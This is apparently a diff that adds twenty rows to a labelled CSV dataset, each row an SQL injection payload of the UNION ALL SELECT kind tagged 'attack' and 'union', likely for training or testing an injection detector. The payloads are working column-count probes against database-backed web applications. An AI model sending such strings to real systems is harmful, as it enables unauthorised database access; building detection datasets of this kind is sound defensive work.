+attack,"1%' union all select null,null,null,null,null,null,null,null#",union
+attack,"-9928""   )    )    union all select 7511,7511,7511,7511,7511,7511,7511,7511#",union
+attack,"-2909'||  (  select 'qfeq' where 7062  =  7062 union all select 7062,7062,7062,7062,7062,7062--",union
+attack,"1""   )    )    as nbdc where 4444  =  4444 union all select null,null--",union
+attack,"-7656""   )    )     )   union all select 3172,3172,3172,3172,3172,3172,3172,3172,3172,3172--",union
+attack,"1%'   )    )     )   union all select null,null,null,null,null,null,null,null--",union
+attack,1'||  (  select 'lxyu' from dual where 5789  =  5789 union all select null#,union
+attack,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null#",union
+attack,"1"" where 6325  =  6325 union all select null,null,null,null,null,null,null,null,null,null#",union
+attack,"-8654' union all select 7190,7190,7190,7190,7190#",union
+attack,"1'   )    )    union all select null,null,null#",union
+attack,"1   )    )     )   union all select null,null,null,null#",union
+attack,"1' union all select null,null,null,null,null,null,null,null,null#",union
+attack,"-6335""   )    )     )   union all select 3654--",union
+attack,"-2197' union all select 8065,8065,8065,8065--",union
+attack,1   )    )     )   union all select null--,union
+attack,"-4586 union all select 2068,2068,2068,2068--",union
+attack,"1""   )    )    union all select null,null#",union
+attack,"-1504""  )   as wpes where 6256  =  6256 union all select 6256,6256,6256,6256,6256,6256,6256,6256,6256,6256#",union
+attack,"-9150%'   )    )     )   union all select 7057,7057,7057,7057,7057,7057,7057,7057--",union
